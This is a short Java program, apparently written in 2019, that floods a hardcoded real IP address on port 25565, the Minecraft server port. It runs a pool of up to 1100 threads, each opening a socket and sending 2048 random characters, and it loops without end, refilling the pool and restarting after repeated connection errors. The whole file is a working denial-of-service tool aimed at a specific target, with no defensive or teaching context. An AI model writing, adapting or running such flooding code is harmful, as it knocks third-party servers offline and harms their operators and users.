import org.apache.commons.lang3.RandomStringUtils;

import java.io.IOException;
import java.io.OutputStream;
import java.net.Socket;
import java.sql.Time;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.ThreadPoolExecutor;
import java.util.concurrent.TimeUnit;

/**
 * @author crt106 on 2019/8/10.
 */
class MainFuck {

    private static BlockingQueue blockingQueue = new ArrayBlockingQueue(1200);
    private static ThreadPoolExecutor t = new ThreadPoolExecutor(0, 1100, 500, TimeUnit.MILLISECONDS, blockingQueue);
    static int errorCount = 0;

    public static void main(String[] args) {


        Runnable r = () -> {
            Socket socket = null;
            OutputStream os = null;
            try {
                socket = new Socket("120.79.169.48", 25565);
                os = socket.getOutputStream();
            } catch (IOException e) {
                System.out.println(getDateString() + "[" + Thread.currentThread().getId() + "] " + "[ERROR]" + "未能成功连接");
                errorCount++;
                return;
            }

            try {
                String str = RandomStringUtils.randomAlphanumeric(2048);
                byte[] strbyte = str.getBytes();
                int len = 0;
                os.write(strbyte);
                System.out.println(getDateString() + "[" + Thread.currentThread().getId() + "] " + "do one");
                os.close();
            } catch (IOException e) {
                System.out.println(getDateString() + "[" + Thread.currentThread().getId() + "] " + "ERROR 写入异常");
                return;
            }

        };
        mainAddTask(r);
        while (true) {
            if (t.getActiveCount() < 910) {
                for (int i = 0; i < 90; i++) {
                    t.execute(r);
                }
            }
            if (errorCount > 500) {
                System.out.println("[INFO] restart");
                errorCount = 0;
                mainAddTask(r);
            }
        }
    }

    public static void mainAddTask(Runnable r) {
        for (int i = 0; i < 1000; i++) {
            t.execute(r);
        }
    }

    public static String getDateString() {
        SimpleDateFormat df = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
        return (df.format(new Date()));
    }
}


